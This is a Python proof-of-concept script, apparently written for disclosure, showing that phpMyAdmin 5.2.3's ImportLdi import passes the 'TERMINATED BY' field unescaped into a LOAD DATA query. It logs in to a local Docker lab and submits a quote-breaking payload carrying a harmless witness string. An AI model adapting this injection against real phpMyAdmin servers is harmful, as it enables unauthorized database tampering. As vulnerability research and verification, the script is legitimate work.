#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: phpmyadmin-importldi (Medium: 6.5)
#  Vendor: phpMyAdmin (phpMyAdmin)
#  Versions: phpMyAdmin 5.2.3 (RELEASE_5_2_3 / 962857e)
#  Impact: ImportLdi interpolates TERMINATED BY unescaped into LOAD DATA
#  Requires: Docker, phpmyadmin:5.2.3, mysql:8.0, loopback 127.0.0.1:19290
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "phpmyadmin-importldi"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove phpMyAdmin 5.2.3 ImportLdi leaves TERMINATED BY unescaped."""

import html as htmlmod
import http.cookiejar
import os
import re
import subprocess
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from pathlib import Path

LABEL = "phpmyadmin-importldi"
WITNESS = "PMA-IMPORTLDI-WITNESS"
ENCLOSED_MARK = "PMA-IMPORTLDI-ENCLOSED"
PIN_TAG = "RELEASE_5_2_3"
PIN_SHA = "962857e"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
HERE = Path(__file__).resolve().parent
BASE = "http://127.0.0.1:19290"
USER = "appuser"
PASSWORD = "apppass"
DB = "appdb"
TABLE = "ldi_target"
IMPORTLDI_PATH = "/var/www/html/libraries/classes/Plugins/Import/ImportLdi.php"
TERMINATED_PAYLOAD = f"',{WITNESS}"
ENCLOSED_PAYLOAD = f"',{ENCLOSED_MARK}"
CSV_BYTES = b"2,labrow\n"


@dataclass(frozen=True)
class HttpResult:
    status: int
    body: str
    url: str


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def extract_named(name: str, html: str) -> str | None:
    pattern = (
        r'name="%s"[^>]*value="([^"]*)"|value="([^"]*)"[^>]*name="%s"'
        % (re.escape(name), re.escape(name))
    )
    match = re.search(pattern, html, re.I)
    if not match:
        return None
    return htmlmod.unescape(match.group(1) or match.group(2))


def normalize(text: str) -> str:
    return htmlmod.unescape(text.replace("\\/", "/"))


def multipart(
    fields: dict[str, str],
    files: dict[str, tuple[str, bytes]],
) -> tuple[bytes, str]:
    boundary = "----PmaImportLdiBoundary"
    chunks: list[bytes] = []
    for name, value in fields.items():
        chunks.append(
            (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="{name}"\r\n'
                f"\r\n"
                f"{value}\r\n"
            ).encode()
        )
    for name, (filename, content) in files.items():
        chunks.append(
            (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'
                f"Content-Type: text/csv\r\n"
                f"\r\n"
            ).encode()
            + content
            + b"\r\n"
        )
    chunks.append(f"--{boundary}--\r\n".encode())
    return b"".join(chunks), f"multipart/form-data; boundary={boundary}"


class Client:
    def __init__(self, base: str) -> None:
        self.base = base.rstrip("/")
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar)
        )

    def get(self, path: str) -> HttpResult:
        url = self.base + path
        req = urllib.request.Request(url, method="GET")
        return self._open(req, url)

    def post_form(self, path: str, data: dict[str, str]) -> HttpResult:
        url = self.base + path
        body = urllib.parse.urlencode(data).encode()
        req = urllib.request.Request(
            url,
            data=body,
            method="POST",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        return self._open(req, url)

    def post_multipart(
        self,
        path: str,
        fields: dict[str, str],
        files: dict[str, tuple[str, bytes]],
    ) -> HttpResult:
        url = self.base + path
        body, content_type = multipart(fields, files)
        req = urllib.request.Request(
            url,
            data=body,
            method="POST",
            headers={"Content-Type": content_type},
        )
        return self._open(req, url)

    def _open(self, req: urllib.request.Request, url: str) -> HttpResult:
        try:
            with self.opener.open(req, timeout=45) as resp:
                raw = resp.read()
                charset = resp.headers.get_content_charset() or "utf-8"
                return HttpResult(resp.status, raw.decode(charset, "replace"), resp.geturl())
        except urllib.error.HTTPError as exc:
            raw = exc.read()
            return HttpResult(exc.code, raw.decode("utf-8", "replace"), url)


def pin_source_ok() -> tuple[bool, str]:
    result = compose("exec", "-T", "pma", "cat", IMPORTLDI_PATH, timeout=30)
    text = result.stdout
    if result.returncode != 0 or not text:
        return False, result.stderr.strip() or "importldi-missing"
    raw_terminated = ".$ldi_terminated." in text.replace(" ", "") and "TERMINATED BY" in text
    enclosed_escaped = "$dbi->escapeString($ldi_enclosed)" in text
    escaped_terminated = "$dbi->escapeString($ldi_terminated)" in text
    ok = raw_terminated and enclosed_escaped and not escaped_terminated
    snippet = " ".join(
        line.strip()
        for line in text.splitlines()
        if "TERMINATED BY" in line or "ENCLOSED BY" in line or "ldi_terminated" in line
    )
    return ok, snippet[:240]


def general_log() -> str:
    result = compose(
        "exec",
        "-T",
        "db",
        "sh",
        "-c",
        "cat /tmp/general.log 2>/dev/null || true",
        timeout=30,
    )
    return result.stdout


def login(client: Client) -> HttpResult | None:
    page = client.get("/index.php?route=/")
    token = extract_named("token", page.body)
    set_session = extract_named("set_session", page.body)
    if not token:
        log("IOC login-page-no-token")
        return None
    fields = {
        "pma_username": USER,
        "pma_password": PASSWORD,
        "server": "1",
        "token": token,
        "set_session": set_session or "",
        "route": "/",
    }
    return client.post_form("/index.php?route=/", fields)


def logged_in(body: str) -> bool:
    lowered = body.lower()
    if "pma_username" in body and "pma_password" in body:
        return False
    return any(
        marker in lowered
        for marker in (
            "server-breadcrumb",
            'id="page_content"',
            "route=/server/databases",
            "route=/database/structure",
            "logged in as",
            "log out",
            "logout",
        )
    )


def import_fields(token: str, terminated: str, enclosed: str, escaped: str) -> dict[str, str]:
    return {
        "token": token,
        "server": "1",
        "db": DB,
        "table": TABLE,
        "import_type": "table",
        "format": "ldi",
        "charset_of_file": "utf-8",
        "ldi_terminated": terminated,
        "ldi_enclosed": enclosed,
        "ldi_escaped": escaped,
        "ldi_new_line": "auto",
        "ldi_local_option": "something",
        "skip_queries": "0",
        "ajax_request": "true",
    }


def load_data_blob(text: str) -> str:
    norm = normalize(text)
    match = re.search(r"LOAD DATA[\s\S]{0,1200}?INTO TABLE[\s\S]{0,400}", norm, re.I)
    if match:
        return re.sub(r"\s+", " ", match.group(0))
    return ""


def terminated_raw(blob: str) -> bool:
    return f"TERMINATED BY '',{WITNESS}'" in normalize(blob)


def enclosed_raw(blob: str) -> bool:
    return f"ENCLOSED BY '',{ENCLOSED_MARK}'" in normalize(blob)


def enclosed_escaped(blob: str) -> bool:
    norm = normalize(blob)
    return (
        f"ENCLOSED BY '\\',{ENCLOSED_MARK}'" in norm
        or f"ENCLOSED BY '\\\\',{ENCLOSED_MARK}'" in norm
        or f"ENCLOSED BY '\\'',{ENCLOSED_MARK}'" in norm
    )


def main() -> int:
    log(f"IOC pin={PIN_TAG} sha={PIN_SHA} url={BASE} project={COMPOSE_PROJECT}")

    pin_ok, pin_info = pin_source_ok()
    log(f"IOC pin-source-ok={pin_ok} {pin_info[:240]}")
    if not pin_ok:
        return fail("pin-source-mismatch")

    client = Client(BASE)
    home = login(client)
    if home is None:
        return fail("login-form-missing")
    log(f"IOC login status={home.status} logged_in={logged_in(home.body)}")
    if not logged_in(home.body):
        retry = client.get("/index.php?route=/")
        log(f"IOC login-follow status={retry.status} logged_in={logged_in(retry.body)}")
        if not logged_in(retry.body):
            snippet = re.sub(r"\s+", " ", retry.body)[:400]
            log(f"IOC login-body {snippet}")
            return fail("login-failed")
        home = retry
    if "5.2.3" not in home.body and "5.2.3" not in client.get("/index.php?route=/").body:
        log("IOC version-marker-missing (continuing)")
    else:
        log("IOC version=5.2.3")

    form = client.get(f"/index.php?route=/table/import&db={DB}&table={TABLE}")
    token = extract_named("token", form.body) or extract_named("token", home.body)
    if not token:
        return fail("csrf-token-missing")
    log(f"IOC import-form status={form.status} token={token[:12]}...")

    files = {"import_file": ("lab.csv", CSV_BYTES)}
    term = client.post_multipart(
        f"/index.php?route=/import&db={DB}&table={TABLE}",
        import_fields(token, TERMINATED_PAYLOAD, "", "\\"),
        files,
    )
    term_blob = load_data_blob(term.body)
    glog = general_log()
    term_in_html = terminated_raw(term.body)
    term_in_log = terminated_raw(glog)
    log(
        f"IOC terminated status={term.status} html_raw={term_in_html} "
        f"log_raw={term_in_log} sql={term_blob[:220]!r}"
    )
    if not term_in_html and not term_in_log:
        snippet = re.sub(r"\s+", " ", normalize(term.body))[:700]
        log(f"IOC terminated-body {snippet}")
        log(f"IOC general-log-tail {glog[-500:]!r}")
        return fail("terminated-not-raw")

    form2 = client.get(f"/index.php?route=/table/import&db={DB}&table={TABLE}")
    token2 = extract_named("token", form2.body) or token
    enc = client.post_multipart(
        f"/index.php?route=/import&db={DB}&table={TABLE}",
        import_fields(token2, ",", ENCLOSED_PAYLOAD, "\\"),
        files,
    )
    enc_blob = load_data_blob(enc.body)
    glog2 = general_log()
    enc_is_raw = enclosed_raw(enc.body) or enclosed_raw(glog2)
    enc_is_esc = enclosed_escaped(enc.body) or enclosed_escaped(glog2)
    log(
        f"IOC enclosed status={enc.status} raw={enc_is_raw} escaped={enc_is_esc} "
        f"sql={enc_blob[:220]!r}"
    )
    if enc_is_raw and not enc_is_esc:
        return fail("enclosed-also-unescaped")
    if not enc_is_esc:
        log("IOC enclosed-escape-not-seen (negative control weak; terminated still raw)")

    log(
        "SUCCESS phpmyadmin-importldi pin=RELEASE_5_2_3 how=live "
        f"TERMINATED-BY-raw ENCLOSED-escaped {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

